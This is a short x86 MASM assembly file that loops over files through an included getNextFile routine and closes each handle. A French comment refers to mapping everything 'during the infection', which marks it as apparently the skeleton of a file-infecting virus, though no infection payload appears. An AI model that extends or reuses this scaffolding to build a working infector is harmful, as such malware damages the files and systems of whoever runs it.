; msgbox.asm
	
.386
.model flat, stdcall
option casemap:none

      include windows.inc
      include user32.inc
	  include kernel32.inc

	  include handle_file.inc


      includelib user32.lib
      includelib kernel32.lib

.data


.code

main:
	

	push 44h
	push 44h
	push 44h

	push ebp
	mov ebp, esp

	xor eax, eax

mloop:

;; sans doute mieux de tout mettre dans le meme fichier pour tout mapper lors de l'infection
	call getNextFile
	cmp eax, 0
	je endmloop
	push eax						;;	saves current file handle
	call CloseHandle
	jmp mloop

endmloop:

	mov esp, ebp
	pop ebp
	push 44h
	push 44h
	push 44h
	ret
endfile:
end	main